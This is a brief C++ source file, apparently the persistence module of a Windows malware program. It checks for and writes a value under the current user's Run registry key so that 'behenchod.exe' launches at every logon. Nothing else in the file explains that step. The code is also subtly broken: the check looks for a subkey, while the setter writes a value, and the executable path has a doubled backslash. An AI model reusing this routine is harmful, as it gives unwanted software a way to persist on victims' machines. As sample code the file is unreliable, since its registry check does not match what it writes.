#include <windows.h>
#include <string>
#include <iostream>
#include "persist.h"
using namespace std;

bool check_run() {
	HKEY hkey;
	LONG open_status = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\behenchod", 0, KEY_READ ,&hkey);
	if (open_status == ERROR_SUCCESS) {
		return true;
	}
	return false;
}

bool set_run() {
	HKEY hkey;
	wstring svc = L"C:\\\\behenchod.exe";
	LONG create_status = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG set_status = RegSetValueEx(hkey, L"behenchod", 0, REG_SZ, (BYTE *)svc.c_str(), (svc.size() + 1) * sizeof(wchar_t));
	if (create_status == ERROR_SUCCESS && set_status == ERROR_SUCCESS) {
		return true;
	}
	return false;
}
